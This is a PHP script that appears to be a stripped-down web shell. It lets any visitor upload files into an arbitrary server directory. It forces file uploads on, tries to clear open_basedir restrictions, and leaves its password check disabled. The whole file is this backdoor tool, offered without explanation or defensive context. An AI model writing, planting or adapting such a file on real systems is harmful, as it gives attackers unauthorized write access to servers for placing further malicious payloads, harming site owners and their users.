<?php

$passprompt = "Fileupload";
$passhash = "";

function e($s) { echo htmlspecialchars($s, ENT_QUOTES); }

function h($s)
{
	global $passprompt;
	if (function_exists('hash_hmac'))
	{
		return hash_hmac('sha256', $s, $passprompt);
	}
	else
	{
		return bin2hex(mhash(MHASH_SHA256, $s, $passprompt));
	}
}



ini_set('log_errors', '0');
ini_set('display_errors', '1');
error_reporting(E_ALL);

while (@ ob_end_clean());

if (! isset($_SERVER))
{
	global $HTTP_POST_FILES, $HTTP_POST_VARS, $HTTP_SERVER_VARS;
	$_FILES = &$HTTP_POST_FILES;
	$_POST = &$HTTP_POST_VARS;
	$_SERVER = &$HTTP_SERVER_VARS;
}

$auth = '';
$cwd = empty($_POST['cwd']) ? getcwd() : $_POST['cwd'];
$pass = empty($_POST['pass']) ? '' : $_POST['pass'];
$url = $_SERVER['REQUEST_URI'];
$status = '';
$ok = '&#9786; :';
$warn = '&#9888; :';
$err = '&#9785; :';

if (! empty($passhash))
{
	if (function_exists('hash_hmac') || function_exists('mhash'))
	{
		$auth = empty($_POST['auth']) ? h($pass) : $_POST['auth'];
		if (h($auth) !== $passhash)
		{
			?>
				<form method="post" action="<?php e($url); ?>">
					<?php e($passprompt); ?>
					<input type="password" size="15" name="pass">
					<input type="submit" value="Send">
				</form>
			<?php
			exit;
		}
	}
	else
	{
		$status .= "${warn} Authentication disabled ('mhash()' missing).<br />";
	}
}


if (! ini_get('file_uploads'))
{
	ini_set('file_uploads', '1');
	if (! ini_get('file_uploads'))
	{
		$status .= "${warn} File uploads disabled.<br />";
	}
}
if (ini_get('open_basedir') && ! ini_set('open_basedir', ''))
{
	$status .= "${warn} open_basedir = " . ini_get('open_basedir') . "<br />";
}

if (! chdir($cwd))
{
  $cwd = getcwd();
}


if (ini_get('file_uploads') && ! empty($_FILES['upload']))
{
	$dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
	if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest))
	{
		$status .= "${ok} Uploaded file <i>${dest}</i> (" . $_FILES['upload']['size'] . " bytes)<br />";
	}
}
?>

<form method="post" action="<?php e($url); ?>"
	<?php if (ini_get('file_uploads')): ?>
		enctype="multipart/form-data"
	<?php endif; ?>
	>
	<?php if (! empty($passhash)): ?>
		<input type="hidden" name="auth" value="<?php e($auth); ?>">
	<?php endif; ?>
	<table border="0">
		<tr><td>
			<b>CWD:</b>
		</td><td>
			<input type="text" size="50" id="cwd" name="cwd" value="<?php e($cwd); ?>">
			<?php if (ini_get('file_uploads')): ?>
				<b>Upload:</b> <input type="file" id="upload" name="upload">
			<?php endif; ?>
		</td></tr>	
		<tr><td colspan="2" style="text-align: center;">
			<input type="submit" value="Execute" style="text-align: right;">
		</td></tr>
	</table>
	
</form>
<hr />

<?php
if (! empty($status))
{
	echo "<p>${status}</p>";
}

echo "<pre>";

exit;
?>
